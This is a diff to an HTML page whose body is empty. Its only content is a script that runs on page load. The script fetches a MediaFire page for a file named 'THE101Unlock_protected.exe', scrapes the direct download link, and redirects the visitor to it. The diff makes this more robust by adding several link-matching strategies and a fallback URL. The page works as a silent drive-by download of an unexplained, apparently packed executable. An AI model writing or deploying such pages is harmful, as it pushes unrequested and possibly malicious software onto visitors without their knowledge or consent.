@@ -1,11 +1,27 @@
+<!DOCTYPE html>
 <html>
-<script>
-fetch('https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file')
-.then(r=>r.text()).then(h=>{
-    const m=h.match(/href="(https:\/\/download[^"]*\.mediafire\.com[^"]*\.exe)"/);
-    window.location.href=m?m[1]:'https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file';
-});
-</script>
+<head>
+    <script>
+        (async function() {
+            try {
+                const response = await fetch('https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file');
+                const html = await response.text();
+                
+                // Multiple strategies to find download link
+                const downloadLink = html.match(/href="(https:\/\/download[^"]*\.mediafire\.com[^"]*\.exe)"/);
+                const downloadButton = html.match(/id="downloadButton"[^>]*href="([^"]*)"/);
+                const directLink = html.match(/"direct_download":"([^"]*)"/);
+                
+                const finalUrl = downloadLink?.[1] || downloadButton?.[1] || directLink?.[1] || 
+                               'https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file';
+                
+                window.location.href = finalUrl;
+            } catch (error) {
+                window.location.href = 'https://www.mediafire.com/file/4uf3c1l49gih2ti/THE101Unlock_protected.exe/file';
+            }
+        })();
+    </script>
+</head>
 <body>
 </body>
 </html>
